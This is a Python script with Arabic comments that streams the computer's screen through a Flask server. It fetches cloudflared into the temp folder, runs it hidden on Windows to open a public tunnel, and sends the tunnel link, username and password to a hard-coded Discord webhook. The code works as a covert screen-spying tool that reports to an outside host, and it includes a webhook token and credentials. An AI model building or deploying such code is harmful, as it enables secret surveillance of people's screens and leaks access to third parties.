import json
import os
import re
import subprocess
import threading
import time
import urllib.request
import sys
import io
from flask import Flask, Response, request
from PIL import Image, ImageGrab

# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dYSICa5I0Gf6pmn0hTtUksrLaWtL5XXSyrYCOwBOmy8V0mazn_fDVVJ-bp"

# ===== 2. بيانات الأمان =====
USERNAME = "IMNOTSNEAKER"
PASSWORD = "3mko@3omar"

app = Flask(__name__)


def check_auth(username, password):
    return username == USERNAME and password == PASSWORD


def authenticate():
    return Response(
        'Login Required',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'},
    )


def generate_frames():
    # استخدام Pillow بدل OpenCV لالتقاط الشاشة وتحويل الإطارات إلى JPEG
    while True:
        try:
            # التقاط الشاشة
            img = ImageGrab.grab()
            img = img.resize((720, 1280))  # أبعاد الشاشة بالطول

            # تحويل الصورة إلى JPEG في الذاكرة
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=65)
            frame_bytes = buf.getvalue()

            yield (
                b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n'
            )
            time.sleep(0.04)  # ضبط معدل الإطارات ~25 FPS وتقليل استهلاك المعالج
        except Exception:
            time.sleep(0.1)


@app.route('/')
def index():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    return '''
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Mobile Screen Share</title>
        <style>
            body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
            img { height: 100%; object-fit: contain; }
        </style>
    </head>
    <body>
        <img src="/video_feed" />
    </body>
    </html>
    '''


@app.route('/video_feed')
def video_feed():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()
    return Response(
        generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame'
    )


def send_to_discord(public_url):
    if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
        return

    payload = {
        "embeds": [
            {
                "title": "📱 تم تشغيل بث شاشة الموبايل بنجاح!",
                "color": 5814783,
                "fields": [
                    {
                        "name": "🔗 رابط البث المباشر",
                        "value": (
                            f"[اضغط هنا لفتح البث]({public_url})\n`{public_url}`"
                        ),
                    },
                    {
                        "name": "👤 اسم المستخدم",
                        "value": f"`{USERNAME}`",
                        "inline": True,
                    },
                    {
                        "name": "🔑 كلمة السر",
                        "value": f"`{PASSWORD}`",
                        "inline": True,
                    },
                ],
                "footer": {
                    "text": "Mobile Screen Share • يعمل في الخلفية"
                },
            }
        ]
    }

    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
        )
        urllib.request.urlopen(req)
    except Exception:
        pass


def start_tunnel(port):
    time.sleep(1)
    temp_dir = os.environ.get("TEMP", os.getcwd())
    
    # تحديد ملف cloudflared المناسب لنظام التشغيل (Windows أو Linux/Android)
    is_windows = sys.platform == "win32"
    cf_filename = "cloudflared.exe" if is_windows else "cloudflared"
    cf_exe = os.path.join(temp_dir, cf_filename)

    if not os.path.exists(cf_exe):
        try:
            if is_windows:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            
            urllib.request.urlretrieve(url, cf_exe)
            if not is_windows:
                os.chmod(cf_exe, 0o755)  # إعطاء صلاحيات التشغيل على نظام الأندرويد/لينكس
        except Exception:
            return

    try:
        cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
        
        kwargs = {
            "stdout": subprocess.PIPE,
            "stderr": subprocess.STDOUT,
            "encoding": "utf-8",
            "errors": "ignore",
            "bufsize": 1,
        }
        if is_windows:
            kwargs["creationflags"] = 0x08000000  # خيار الخفاء للندوز فقط

        proc = subprocess.Popen(cmd, **kwargs)

        for line in iter(proc.stdout.readline, ""):
            if "trycloudflare.com" in line:
                match = re.search(
                    r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line
                )
                if match:
                    send_to_discord(match.group(0))
                    break
    except Exception:
        pass


if __name__ == "__main__":
    PORT = 8080
    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()

    # تشغيل سيرفر Flask
    app.run(host='0.0.0.0', port=PORT, threaded=True)
